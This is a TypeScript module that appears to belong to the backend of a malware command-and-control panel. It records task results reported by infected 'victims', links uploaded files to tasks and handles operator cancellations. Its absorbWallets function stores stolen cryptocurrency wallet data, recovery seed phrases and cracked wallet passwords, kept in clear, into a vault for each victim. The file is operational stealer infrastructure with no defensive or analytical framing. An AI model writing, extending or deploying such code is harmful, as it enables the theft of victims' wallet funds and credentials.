import { prisma } from './db';
import { publish } from './bus';
import { recordFailure } from './ws-events';
import { normalizePath, normalizeState, upsertSecrets, upsertWallets, type SecretInput } from '../services/vault';

export type ResultBody = {
  status: 'ok' | 'error' | 'cancelled';
  error?: string | null;
  result: Record<string, unknown>;
  artifacts?: Array<{ upload_request: string }>;
};

export type ApplyOutcome = 'applied' | 'duplicate' | 'conflict' | 'missing';

/**
 * Store one task result, whether it arrived over signed HTTP or the control
 * channel. Idempotent by task id and final status.
 */
export async function applyTaskResult(victimId: string, taskId: string, input: ResultBody): Promise<ApplyOutcome> {
  const task = await prisma.task.findFirst({ where: { id: taskId, victimId } });
  if (!task) return 'missing';
  const marker = input.result?.http_result === true;
  // `unknown` is terminal: the source may be gone, so no later result revives it.
  const terminal = task.status === 'done' || task.status === 'error' || task.status === 'cancelled' || task.status === 'unknown';
  // Only the retry-ish paths are worth a line: a marker/duplicate arriving
  // against a closed task is exactly where results used to get lost.
  if (marker || terminal) {
    console.log('[result]', taskId, 'marker=' + marker, 'status=' + task.status,
      'stored=' + JSON.stringify(task.result), 'incoming=' + JSON.stringify(input.result).slice(0, 200));
  }
  if (terminal && task.result) {
    if (marker) return 'duplicate';
    // A real http_only body may arrive after its own marker frame; it owns the
    // final result even though the marker already closed the task.
    if ((task.result as { http_result?: boolean }).http_result !== true) {
      const same = task.status === (input.status === 'ok' ? 'done' : input.status === 'error' ? 'error' : 'cancelled');
      return same ? 'duplicate' : 'conflict';
    }
  }
  await prisma.task.update({
    where: { id: taskId },
    data: {
      status: input.status === 'ok' ? 'done' : input.status === 'error' ? 'error' : 'cancelled',
      error: input.error ?? null,
      result: input.result as never,
      finishedAt: new Date(),
      leaseUntil: null
    }
  });
  // Link every upload the result names, so Files can close by task id.
  for (const artifact of input.artifacts ?? []) {
    await prisma.artifact.updateMany({
      where: { uploadId: artifact.upload_request, victimId },
      data: { taskId }
    });
  }
  if (input.status === 'ok') await absorbWallets(victimId, input.result);
  else {
    await recordFailure(victimId, 'task_failed', `${task.name}:${(input.error ?? input.status).slice(0, 120)}`,
      `task ${task.name} ${input.status}: ${input.error ?? ''}`).catch(() => undefined);
  }
  if (task.name === 'cancel') {
    // The cancel task answers last; make sure the target also closes.
    const target = typeof (task.params as { task_id?: string }).task_id === 'string'
      ? (task.params as { task_id: string }).task_id
      : '';
    if (target) {
      await prisma.task.updateMany({
        where: { id: target, victimId, status: { in: ['queued', 'running'] } },
        data: { status: 'cancelled', error: 'cancelled by operator', finishedAt: new Date(), leaseUntil: null }
      });
    }
  }
  void publish({ type: 'task.update', victimId, at: Date.now(), data: { id: taskId, status: input.status } });
  return 'applied';
}

export async function absorbWallets(victimId: string, result: Record<string, unknown>): Promise<void> {
  const wallets = Array.isArray(result.wallets) ? result.wallets : [];
  const rows = wallets.slice(0, 500).flatMap((item) => {
    if (!item || typeof item !== 'object') return [];
    const wallet = item as Record<string, unknown>;
    if (typeof wallet.path !== 'string' || typeof wallet.id !== 'string') return [];
    return [{
      targetId: String(wallet.id),
      kind: String(wallet.kind ?? 'extension'),
      path: wallet.path,
      state: normalizeState(wallet.state),
      reason: wallet.reason ? String(wallet.reason) : null,
      address: wallet.address ? String(wallet.address) : null,
      balance: wallet.balance ? String(wallet.balance) : null,
      source: 'task_result',
      decryptState: wallet.decrypt_state ? String(wallet.decrypt_state) : undefined
    }];
  });
  const stored = await upsertWallets(victimId, rows);
  const byPath = new Map(stored.map((row) => [row.path, row.id]));
  const secrets: SecretInput[] = (Array.isArray(result.seeds) ? result.seeds : []).slice(0, 500).flatMap((item) => {
    if (!item || typeof item !== 'object') return [];
    const seed = item as Record<string, unknown>;
    if (typeof seed.value !== 'string' || !seed.value) return [];
    return [{
      walletId: typeof seed.path === 'string' ? byPath.get(normalizePath(seed.path)) ?? null : null,
      path: typeof seed.path === 'string' ? seed.path : null,
      kind: String(seed.kind ?? 'seed'),
      value: seed.value,
      words: Number.isFinite(Number(seed.words)) ? Number(seed.words) : null,
      source: 'task_result'
    }];
  });
  // A crack result carries the recovered password in clear; keep it in the vault.
  if (typeof result.password === 'string' && result.password && typeof result.target === 'string') {
    const wallet = await prisma.wallet.findFirst({ where: { victimId, targetId: result.target }, select: { id: true } });
    if (wallet) secrets.push({ walletId: wallet.id, kind: 'password', value: result.password, source: 'crack_vault' });
  }
  await upsertSecrets(victimId, secrets);
}
